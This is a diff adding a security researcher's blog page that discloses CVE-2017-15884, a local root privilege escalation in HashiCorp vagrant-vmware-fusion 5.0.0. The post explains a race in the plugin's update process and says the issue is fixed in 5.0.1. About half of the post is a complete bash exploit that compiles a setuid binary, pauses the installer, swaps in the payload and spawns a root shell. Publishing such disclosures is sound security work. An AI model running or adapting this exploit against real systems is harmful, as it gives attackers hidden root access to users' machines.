@@ -1,0 +1,211 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+        <link rel="stylesheet" type="text/css" href="/css/style.css" />
+        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+        <script src='https://www.google.com/recaptcha/api.js'></script>
+        <script src="/js/site.js"></script>
+        <title>Mark Wadham</title>
+    </head>
+    <body>
+        <div id="menu">
+                        <h3>Mark Wadham</h3>
+            <ul>
+                <li><a href="/index.html">profile</a></li>
+                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
+                <li><a href="/cves.html">CVEs</a></li>
+                <li><a href="/jsdemos.html">js demos</a></li>
+                <li><a href="/contact.html">contact</a></li>
+                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
+                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
+                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
+                <li class="red space small"></li>
+            </ul>
+
+        </div>
+        <div id="content">
+            <div id="main-content">
+                                            <div class="post">
+                <h2><a href="/blog/cve201715884-local-root-privesc-in-hashicorp-vagrantvmwarefusion-500.html">CVE-2017-15884 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.0</a></h2>
+                <h3>28 Oct 2017 12:32  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                  <pre>After three CVEs and multiple exploits disclosed to Hashicorp they have finally
+upped their game with this plugin. Now the previously vulnerable non-root-owned
+ruby code that get executed as root by the sudo helper is no more and the sudo
+helper itself is one static Go binary with tightly-controlled parameters that
+can&#39;t (as far as I can tell) be exploited on its own.
+
+However I have discovered that the update mechanism in 5.0.0 is not completely
+safe. There is a bug in the update mechanism for 5.0.0 that makes it reinstall
+the plugin when you run:
+
+$ vagrant plugin update
+
+even if there is no update pending. The reinstall includes replacing the sudo
+helper and re-applying root ownership and the suid bit. This is done via
+osascript with a block of shell as an easy way to show a graphical popup
+authentication dialog to the user.
+
+After the credentials are entered and the permissions are applied the installer
+for the plugin immediately checks the hash of the sudo helper binary and if it
+doesn&#39;t match it removes it. On the surface this seemed to make a race condition
+impossible however after some poking around I found a way to exploit it.
+
+Because the authentication prompt is a guarantee of at least a few seconds pause
+in the intallation, we can catch this point in time very easily by scanning the
+process list watching for the invocation of osascript. Once we see this we can
+lay a trap by replacing the sudo helper binary with an exploit payload (remember
+this is always in a non-root-owned directory).
+
+As soon as the privileges are set vagrant will execute its checksum and remove
+the payload, however because we&#39;ve caught execution at the right time and
+because the installer is a different process from the osascript process we can
+send a STOP signal to the installer to pause its execution. This means osascript
+will set the permissions and then the installer will not immediately remove the
+binary, giving us time to move our newly suid-root&#39;d payload out of the way, use
+it to obtain root privileges, and then move the real sudo helper back into place
+and chmod +s it ourselves so that vagrant doesn&#39;t realise anything bad has
+happened.
+
+This all takes place in a second or two so the user is unlikely to notice
+either. Once this is done we simply send a CONT signal to the installer to allow
+it to continue as normal. The plugin is installed correctly with the right
+permissions, the user didn&#39;t see any errors or warnings, and we have an suid
+root payload that we can execute to spawn a root shell.
+
+This issue is fixed in version 5.0.1.
+
+<a href="https://m4.rkw.io/vagrant_vmware_privesc_5.0.0.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_5.0.0.sh.txt</a>
+cdbdf9e620eba0d897a3ef92b6872dbb0b194eaf548c23953a42678a566f71f0
+-------------------------------------------------------------------------------
+#!/bin/bash
+echo &quot;########################################&quot;
+echo &quot;vagrant_vmware_fusion 5.0.0 root privesc&quot;
+echo &quot;by m4rkw&quot;
+echo &quot;########################################&quot;
+echo
+echo &quot;compiling...&quot;
+
+cat &gt; vvf.c &lt;&lt;EOF
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(int ac, char *av[])
+{
+  setuid(0);
+  seteuid(0);
+  if (ac &gt; 1) {
+    system(&quot;chown root vagrant_vmware_desktop_sudo_helper_darwin_amd64&quot;);
+    system(&quot;chmod 4755 vagrant_vmware_desktop_sudo_helper_darwin_amd64&quot;);
+    return 0;
+  }
+  system(&quot;rm -f /tmp/vvf_exp&quot;);
+  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c
+
+echo &quot;waiting for user to initiate vagrant plugin update...&quot;
+
+while :
+do
+  r=`ps auxwww |grep &#39;/usr/bin/osascript -e do shell script&#39; |grep &#39;vagrant_vmware_desktop_sudo_helper_darwin_amd64&#39;`
+  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+    break
+  fi
+done
+
+pid=`ps auxww |grep &#39;./vagrant-vmware-installer_darwin_amd64&#39; |grep -v grep |xargs -L1 |cut -d &#39; &#39; -f2`
+
+echo &quot;pausing installer...&quot;
+
+kill -STOP $pid
+
+cd $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.0/bin
+
+echo &quot;dropping payload in place of sudo helper binary...&quot;
+
+mv -f vagrant_vmware_desktop_sudo_helper_darwin_amd64 vagrant_vmware_desktop_sudo_helper_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant_vmware_desktop_sudo_helper_darwin_amd64
+
+echo &quot;waiting for suid...&quot;
+
+while :
+do
+  r=`ls -la vagrant_vmware_desktop_sudo_helper_darwin_amd64 |grep -- &#39;-rwsr-xr-x&#39; |grep root`
+  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+    echo &quot;moving the real helper back into place...&quot;
+    mv -f ./vagrant_vmware_desktop_sudo_helper_darwin_amd64 /tmp/vvf_exp
+    mv -f vagrant_vmware_desktop_sudo_helper_darwin_amd64.orig vagrant_vmware_desktop_sudo_helper_darwin_amd64
+
+    echo &quot;fixing perms...&quot;
+    /tmp/vvf_exp 1
+
+    echo &quot;allow vagrant to continue...&quot;
+    kill -CONT $pid
+
+    echo &quot;spawning shell...&quot;
+    /tmp/vvf_exp
+    exit 0
+  fi
+done</pre>
+            </div>
+
+
+            </div>
+            <div id="right-content">
+                
+            <ul>
+              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[year]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[tag]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+            </ul>
+
+            </div>
+        </div>
+				<script>
+						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+						ga('create', 'UA-91604161-1', 'auto');
+						ga('send', 'pageview');
+				</script>
+    </body>
+</html>
